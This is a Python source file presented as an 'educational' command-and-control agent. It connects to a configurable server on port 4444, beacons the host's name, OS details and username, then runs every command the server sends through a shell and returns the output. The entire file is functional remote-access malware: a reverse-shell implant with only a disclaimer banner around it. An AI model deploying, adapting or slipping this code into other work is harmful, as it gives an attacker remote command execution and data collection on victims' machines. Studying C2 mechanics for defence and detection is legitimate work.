#!/usr/bin/env python3
"""
Educational C2 Agent (Client)
This is for educational purposes only - demonstrates C2 agent concepts
"""

import socket
import json
import subprocess
import platform
import os
import time
from datetime import datetime


class C2Agent:
    def __init__(self, server_host, server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        
    def get_system_info(self):
        """Gather system information for initial beacon"""
        return {
            'hostname': platform.node(),
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'username': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
            'timestamp': datetime.now().isoformat()
        }
        
    def connect(self):
        """Connect to C2 server"""
        max_retries = 5
        retry_delay = 5
        
        for attempt in range(max_retries):
            try:
                print(f"[*] Attempting to connect to {self.server_host}:{self.server_port} (Attempt {attempt + 1}/{max_retries})")
                
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_host, self.server_port))
                
                print(f"[+] Connected to C2 server at {self.server_host}:{self.server_port}")
                
                # Send initial beacon with system info
                beacon = self.get_system_info()
                self.socket.send(json.dumps(beacon).encode('utf-8'))
                
                self.running = True
                return True
                
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                if attempt < max_retries - 1:
                    print(f"[*] Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                else:
                    print("[-] Max retries reached. Exiting.")
                    return False
                    
    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout if result.stdout else result.stderr
            
            return {
                'success': result.returncode == 0,
                'output': output,
                'return_code': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': 'Command execution timed out (30s limit)',
                'return_code': -1,
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            return {
                'success': False,
                'output': f'Error executing command: {str(e)}',
                'return_code': -1,
                'timestamp': datetime.now().isoformat()
            }
            
    def run(self):
        """Main agent loop - receive and execute commands"""
        if not self.connect():
            return
            
        print("[+] Agent running. Waiting for commands...")
        
        while self.running:
            try:
                # Receive command from server
                data = self.socket.recv(4096)
                
                if not data:
                    print("[-] Connection closed by server")
                    break
                    
                # Parse command
                cmd_data = json.loads(data.decode('utf-8'))
                command = cmd_data.get('command', '')
                
                print(f"[*] Received command: {command}")
                
                # Handle special commands
                if command.lower() == 'exit':
                    print("[!] Exit command received")
                    self.running = False
                    break
                    
                # Execute command
                result = self.execute_command(command)
                
                # Send response back to server
                response = json.dumps(result)
                self.socket.send(response.encode('utf-8'))
                
                print(f"[+] Command executed, response sent")
                
            except json.JSONDecodeError as e:
                print(f"[-] Error parsing command: {e}")
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
                break
                
        self.cleanup()
        
    def cleanup(self):
        """Clean up resources"""
        print("[*] Cleaning up...")
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("[+] Agent stopped")


if __name__ == "__main__":
    import sys
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║           Educational C2 Agent Framework                  ║
    ║           For Educational Purposes Only                   ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Get server address from command line or use default
    if len(sys.argv) > 1:
        server_host = sys.argv[1]
    else:
        server_host = '127.0.0.1'  # Default to localhost
        
    if len(sys.argv) > 2:
        server_port = int(sys.argv[2])
    else:
        server_port = 4444  # Default port
        
    print(f"[*] Target C2 Server: {server_host}:{server_port}\n")
    
    agent = C2Agent(server_host, server_port)
    
    try:
        agent.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        agent.cleanup()
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        agent.cleanup()
